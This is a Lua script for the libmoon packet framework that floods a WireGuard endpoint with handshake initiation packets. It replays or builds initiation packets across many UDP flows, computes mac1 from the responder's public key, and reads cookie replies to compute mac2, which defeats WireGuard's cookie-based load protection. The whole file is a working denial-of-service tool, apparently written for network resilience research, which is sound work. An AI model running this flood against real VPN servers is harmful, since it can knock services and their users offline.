--- A simple WG initiation flood
local lm     = require "libmoon"
local log    = require "log"
local memory = require "memory"
local stats  = require "stats"
local pcap   = require "pcap"
local arp = require "proto.arp"
local eth = require "proto.ethernet"
local pcap   = require "pcap"
local ns = require "namespaces"

local wireguard = require "proto.wireguard"

local attack = require "attack"

local ffi = require "ffi"
local format = string.format

-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
        attack.configure_pars(parser)
        parser:description("WireGuard handshake initiation packet flooding.")
        parser:option("--flows", "Number of flows to be used. Requries udpSrc (to define the first port)."):args(1):convert(tonumber):default(1)
        parser:option("--replayPcap", "Pcap file to be replayed."):args(1)
        parser:option("--pubkey", "Calculate mac1. Requires publickey of responder."):args(1)

        parser:option("--calcMac2", "Calculates mac2 after receiving cookie responses. Requires Pulickey of responder.")

        return parser:parse()
end

master = attack.main

taskRunning = attack.taskRunning

function txTask(threadId, queue, args)
        log:info("Start txTask.")

        local captureCtr
        if args.outputTxStats then
                captureCtr = stats:newPktTxCounter("thread #" .. threadId, "CSV", args.outputTxStats .. threadId .. ".csv")
        end
        
	local mempool = memory:createMemPool()
        local bufs = mempool:bufArray()

        local flowCounter = 0
        local wgInitPkts = createWGInitPkts(args, mempool)

        attack.txTask_sync_start(args)

        local cookieUpdateTimer
        if args.calcMac2 then
                cookieUpdateTimer = time() + 1
        end

        while taskRunning(args) do -- check if Ctrl+c was pressed
                if cookieUpdateTimer and cookieUpdateTimer < time() then
                        wgInitPkts = createWGInitPkts(args, mempool)

                        cookieUpdateTimer = time() + 20
                end

                bufs:alloc(190)

                for i, buf in ipairs(bufs) do

                        local pkt = buf:getWireguardInitiationPacket()

                        

                        if args.flows then
                                ffi.copy(pkt, wgInitPkts[flowCounter + 1], 190)
                                flowCounter = (flowCounter + 1) % args.flows
                        else
                                ffi.copy(pkt, wgInitPkts[1], 190)
                        end
                        
                        attack.txTask_setChecksumOffloading(buf, args)

                        if captureCtr then
				captureCtr:countPacket(buf)
			end
                end

                attack.txTask_send(queue, bufs)

                if captureCtr then
                        captureCtr:update()
                end
                
        end

        if captureCtr then
                captureCtr:finalize()
        end

	log:info("Terminate txTask.")
end

function modifyWGInitPacket(buf, args)
        local pkt = buf:getWireguardInitiationPacket()

        -- Wireguard fields
        if args.mac1 then
                pkt.wireguard:setMac1(args.mac1)
        end

        attack.modifyPkt(buf, args)

        return buf
end


function createWGInitPkt(args, mempool)
        mempool = mempool or memory:createMemPool()
        local PKT_LEN = 190

        -- raw packet
        local res = ffi.new("uint8_t [?]", PKT_LEN)

        local bufArray = mempool:bufArray()

        if args.replayPcap then
                -- Need mempool and bufArray for available pcap reader
                -- TODO: update pcap reader to accept also just a buffer (or bufArray).
                local pcapReader = pcap:newReader(args.replayPcap)
                local n = pcapReader:read(bufArray)
                if n == 0 then
                        pcapReader:reset()
                end
                pcapReader:close()

                modifyWGInitPacket(bufArray[1], args)
        else
                -- Need buffer to create Wireguard initiation packet stack.
                -- TODO: find a way to cast buffer directly to WG init pkt stack.
                -- allocate one buffer (wireguard initiation packet size).
                bufArray:alloc(PKT_LEN, 1)
                local buf = bufArray[1]
                args.pktLength = 190
                buf:getWireguardInitiationPacket():fill(args)
        end

        local buf = bufArray[1]
        local pkt = buf:getWireguardInitiationPacket()

        if args.pubkey then
                pkt.wireguard:calculateMac1(args.pubkey)
        end

        if args.calcMac2 then
                -- store mac1 and pubkey with the sender id as key
                wireguard.storeMac1(buf, args.calcMac2)

                -- check if a cookie value is available
                local key = wireguard.getCookieKey(pkt.ip4:getSrc(), pkt.udp:getSrcPort(), pkt.wireguard:getSender())

                -- print("check cookie: " .. key)

                local cookie, timestamp = wireguard.lookupCookie(key)
                if cookie then
                        pkt.wireguard:calculateMac2(cookie)
                end
        end

        -- similar to pkt:setRawPacket
        ffi.copy(res, pkt, PKT_LEN)

        bufArray:freeAll()

        return res
end

function createWGInitPkts(args, mempool)
        mempool = mempool or memory:createMemPool()

        local wgInitPkts = {}

	if args.flows and args.flows > 1 then
                local argsUdpSrc = args.udpSrc
                for i = 1, args.flows do
                        args.udpSrc = argsUdpSrc + (i - 1)
                        wgInitPkts[i] = createWGInitPkt(args, mempool)
                end
                args.udpSrc = argsUdpSrc
        else
                wgInitPkts[1] = createWGInitPkt(args, mempool)
        end

        return wgInitPkts
end

function rxTask(threadId, queue, args)
	log:info("Started rxTask.")
        local bufs = memory.bufArray()

        local captureCtr
        if args.outputRxStats then
                captureCtr = stats:newPktRxCounter("thread #" .. threadId, "CSV", args.outputRxStats .. threadId .. ".csv")
        end

        local pcapWriter
        if args.outputPcap then
                        pcapWriter = pcap:newWriter(args.outputPcap .. threadId .. ".pcap")
        end


        -- attack.txTask_sync_start(args)

        while taskRunning(args) do
                local rx = queue:tryRecv(bufs, 100)
                local batchTime = lm.getTime()

                for i = 1, rx do
                        local buf = bufs[i]

                        if pcapWriter then
                                pcapWriter:writeBuf(batchTime, buf, 120)
                        end

                        if captureCtr then
                                captureCtr:countPacket(buf)
                        end

                        if args.arpID and buf:getEthernetPacket().eth:getType() == eth.TYPE_ARP then
                                -- inject arp packets to the ARP task
                                -- this is done this way instead of using filters to also dump ARP packets here
                                arp.handlePacket(buf, args.arpID)
                        else
                                if args.calcMac2 then
                                        local pkt = buf:getWireguardPacket()
                                        if pkt.wireguard:getType() == wireguard.TYPE_COOKIE then
                                                pkt = buf:getWireguardCookiePacket()

                                                local key = wireguard.getCookieKey(pkt.ip4:getDst(), pkt.udp:getDstPort())
                                                local cookie, timestamp = wireguard.lookupCookie(key)
                                                -- only update cookie value if there is not one yet
                                                -- or if the last cookie value was updated more than 60 seconds ago
                                                if not cookie or timestamp + 60 > time() then
                                                        wireguard.handleCookiePacket(buf, args.calcMac2)
                                                end
                                        end
                                end

                                -- do not free packets handlet by the ARP task, this is done by the arp task
                                buf:free()
                        end
                end

                if captureCtr then
                        captureCtr:update()
                end
        end
        
        if captureCtr then
                captureCtr:finalize()
        end

        if pcapWriter then
                log:info("Flushing buffers, this can take a while...")
                pcapWriter:close()
        end

        log:info("Terminate rxTask.")
end
